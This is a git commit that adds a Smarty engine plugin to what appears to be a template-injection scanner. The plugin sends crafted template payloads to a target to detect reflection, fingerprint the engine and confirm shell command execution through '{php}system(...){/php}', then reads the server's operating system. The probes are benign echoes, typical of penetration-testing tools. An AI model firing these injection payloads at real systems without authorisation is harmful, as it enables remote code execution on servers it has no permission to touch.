e7dbc68b5caa8fe0f4fc978b23c5f65d3c8e732c
Emilio Pinna <emilio.pinn@gmail.com>
2016-07-01 15:28:10 +0100

    Add Smarty plugin

---
+++ plugins/engines/smarty.py
@@ -0,0 +1,78 @@
+from core.check import Check
+from utils.loggers import log
+import random
+import string
+
+class Smarty(Check):
+    
+    def init(self):
+        
+        # Declare payload
+        self.payload_left = '{%s}' % self.rand_left
+        self.payload_right = '{%s}' % self.rand_right
+        
+        self._check_reflection()
+        
+        if not self.state.get('reflection'):
+            return
+            
+        log.warn('Reflection detected')
+        
+        self._check_engine()
+            
+        if not self.state.get('language') or  not self.state.get('engine'):
+            return
+            
+        log.warn('Smarty engine detected')   
+        
+        self._check_os()
+        
+        if not self.state.get('exec'):
+            return
+            
+        log.warn(
+            'Shell command execution detected on \'%s\' operating system' % (
+                self.state.get('os', 'undetected')
+            )
+        )
+
+    def _check_engine(self):
+        
+        randA = ''.join(random.choice(string.letters + string.digits) for _ in range(2))
+        randB = ''.join(random.choice(string.letters + string.digits) for _ in range(2))
+        
+        payload = '%s{*comment*}%s' % (randA, randB)
+        expected = randA + randB
+                
+        if expected == self.req(payload):
+            self.state['language'] = 'php'
+            self.state['engine'] = 'smarty-*'
+    
+    def _check_reflection(self):
+        
+        randA = random.randint(10, 100)
+        randB = random.randint(10, 100)
+
+        payload = '{%i*%i}' % (randA, randB)
+        expected = str(randA*randB)
+        
+        if expected == self.req(payload):
+            self.state['reflection'] = True
+        
+    def _check_os(self):
+        
+        expected_rand = str(random.randint(999, 10000))
+        payload = """{php}system('echo %s');{/php}""" % expected_rand
+        
+        result_php_tag = self.req(payload) 
+        
+        # If {php} is sent back means is in secure mode
+        if '{php}' in result_php_tag:
+            self.state['engine'] = 'smarty-secured'
+        elif expected_rand == result_php_tag:
+            self.state['engine'] = 'smarty-unsecured'
+            self.state['exec'] = True
+    
+            payload = """{php}echo PHP_OS;{/php}"""
+            self.state['os'] = self.req(payload)    
+        
